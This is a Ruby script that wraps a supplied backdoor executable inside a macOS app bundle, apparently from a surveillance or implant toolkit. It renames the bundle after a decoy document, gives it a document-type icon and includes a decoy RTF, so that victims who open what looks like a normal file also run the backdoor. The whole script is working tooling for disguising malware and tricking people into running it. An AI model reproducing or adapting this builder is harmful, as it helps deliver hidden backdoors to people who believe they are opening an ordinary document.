#!/usr/bin/env ruby

require 'pp'
require 'zip'
require 'zip/filesystem'
require 'fileutils'

if __FILE__ == $0

  base_dir = File.realdirpath(File.dirname($0))

  # prepare the files
  template = File.join base_dir, 'resources/MacFakeDocument.zip'
  backdoor = ARGV[0]
  output = ARGV[1]
  docname = ARGV[2]
  doc = ARGV[3]
  ext = ARGV[4]

  # sanity check on the parameters
  if ARGV.length < 5 
    puts "Invalid argument count (#{ARGV.length} expected 5)"
    exit(1)
  end
  
  # check the the input exists
  unless File.exists?(backdoor)
    puts "Cannot find input backdoor (" + backdoor + ")"
    File.delete(output) if File.exists?(output)
    exit(1)
  end

  unless File.size(backdoor) != 0
    puts "Invalid input backdoor (" + backdoor + ")"
    File.delete(output) if File.exists?(output)
    exit(1)
  end
 
  unless File.exists?(template)
    puts "Cannot find template zip file"
    File.delete(output) if File.exists?(output)
    exit(1)
  end

  icon = File.join base_dir, 'resources/' + ext + '.icns'
  unless File.exists?(icon)
    puts "Cannot find the icon file " + icon
    File.delete(output) if File.exists?(output)
    exit(1)
  end
  
  File.chmod(0755, backdoor)
  FileUtils.cp template, File.join(base_dir, 'app.zip')

  begin
    Zip::File.open(File.join(base_dir, 'app.zip')) do |z|
      z.file.open('TextEdit.app/Contents/Resources/bin/__bck__', "wb") { |f| f.write File.binread(backdoor) }
      z.file.chmod(0755, 'TextEdit.app/Contents/Resources/bin/__bck__')
      z.file.open('TextEdit.app/Contents/Resources/doc/__doc__.rtf', "wb") { |f| f.write File.binread(doc) }
      z.file.open('TextEdit.app/Contents/Resources/icon.icns', "wb") { |f| f.write File.binread(icon) }
    end

    Zip.setup do |c|
      c.on_exists_proc = true
      c.continue_on_exists_proc = true
      c.unicode_names = true
    end

    # FUCKING BUG inside rubyzip!!
    # https://github.com/rubyzip/rubyzip/issues/103
    5.times do
      Zip::File.open(File.join(base_dir, 'app.zip'), "wb") do |z|
        z.each do |f|
          name = f.name.dup

          name.gsub! 'TextEdit.app', File.basename(docname, File.extname(docname)) + '.app'
          name.gsub! '__bck__', 'Textedit' if name['__bck__']
          name.gsub! '__doc__.rtf', docname if name['__doc__']

          #puts " #{f.name} ->  #{name}"

          z.rename f, name if name != f.name
        end
      end
    end

=begin
    puts "OUTPUT:"

    Zip::File.open(File.join(base_dir, 'app.zip'), "wb") do |z|
      z.each do |f|
        puts f.name
      end
    end
=end

  rescue => ex
    puts "Failed to modify the ZIP archive: #{ex.message}"
    puts ex.backtrace.join("\n")
    File.delete(output) if File.exists?(output)
    exit(1)
  end
  
  # if every thing is ok, generate the output
  FileUtils.cp File.join(base_dir, 'app.zip'), output

end